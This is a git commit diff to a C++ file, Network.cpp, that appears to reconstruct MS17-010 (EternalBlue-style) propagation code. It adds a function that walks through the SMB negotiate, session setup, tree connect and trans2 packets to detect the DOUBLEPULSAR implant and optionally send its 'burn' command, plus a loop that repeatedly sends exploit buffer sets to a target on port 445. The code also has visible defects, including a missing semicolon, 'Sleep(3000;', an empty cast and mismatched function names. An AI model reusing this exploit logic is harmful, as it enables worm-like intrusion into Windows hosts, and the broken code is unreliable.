a79fcedbf54da043f8482deead0d5a11a9e6f1c0
bhassani <bhassani@users.noreply.github.com>
2020-07-17 13:37:46 -0500

    Update Network.cpp

--- Network.cpp
+++ Network.cpp
@@ -35,11 +35,97 @@ int canConnectToPort445(char *ip)
 	return result;
 }
 
+int IsDOUBLEPULSAR_Present(char *host, int flagUninstall, u_short hostshort)
+{
+	SOCKET dsock;
+	struct sockaddr name;
+	char userid[2];
+   	char treeid[2];
+	char recvbuff[1024];
+
+	name.sin_family = AF_INET;
+    	name.sin_addr.s_addr = inet_addr(host);
+    	name.sin_port = htons(hostshort);
+	dsock = socket(AF_INET, SOCK_STREAM, 0);
+	connect(dsock, (struct sockaddr*) &name, sizeof(name));
+	
+	//send SMB negociate packet
+	send(dsock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
+	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
+	//send Session Setup AndX request
+	printf("sending Session_Setup_AndX_Request!\n");
+	send(dsock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
+	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
+	
+	//copy userID from recvbuff @ 32,33
+	userid[0] = recvbuff[32];
+	userid[1] = recvbuff[33];
+	
+	//update userID in the tree connect request
+    	treeConnectRequest[32] = userid[0];
+    	treeConnectRequest[33] = userid[1];
+	send(dsock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
+	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
+	
+	//copy treeID from recvbuff @ 28, 29
+    	treeid[0] = recvbuff[28];
+   	treeid[1] = recvbuff[29];
+	
+	trans2_session_setup[28] = treeid[0];
+        trans2_session_setup[29] = treeid[1]
+        trans2_session_setup[32] = userid[0];
+        trans2_session_setup[33] = userid[1];
+
+	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
+	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
+	
+	if (recvbuff[34] == 0x51)
+	{
+		if ( flagUninstall )
+		{
+			WORD burn1, burn2, burn3, burn4, burn5;
+
+		    	burn1 = 66;       //update multiplex ID to x42
+		    	burn2 = 14;       //burn command - trans2_session_setup[49] = "\x0e"
+		    	burn3 = 105;      //burn command - trans2_session_setup[50] = "\x69"
+		    	burn4 = 0;        //burn command - trans2_session_setup[51] = "\x00"
+		    	burn5 = 0;        //burn command - trans2_session_setup[52] = "\x00"
+
+		    	//modify our trans2 session packet to include the burn command
+		    	memcpy(trans2_session_setup + 0x22, (char*)&burn1, 1);
+		    	memcpy(trans2_session_setup + 0x31, (char*)&burn2, 1);
+		    	memcpy(trans2_session_setup + 0x32, (char*)&burn3, 1);
+		    	memcpy(trans2_session_setup + 0x33, (char*)&burn4, 1);
+		    	memcpy(trans2_session_setup + 0x34, (char*)&burn5, 1);
+			send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
+            		recv(dsock, (char*)uninstall_response, 1024, 0);
+			closesocket(dsock);
+			return 1;
+		}
+		closesocket(dsock);
+	}
+	return 0;
+}
+
 DWORD MS17_010(DWORD LPPARAM)
 {
 
 	lpparam = (struct in_addr) ;
 	int attemptCount;
+	if ( tryFirstSetBuffers(&target, 445))
+	{
+		attemptCount = 0;
+		do
+		{
+			Sleep(3000;
+			if ( IsDOUBLEPULSARInstalled(&target, 1, 445) )
+			      break;
+		      	Sleep(3000);
+		      	trySecondSetBuffers(&target, 445);
+		      	++attemptCount;
+		 }
+		 while ( attemptCount < 5 );
+	}
 }
 
 
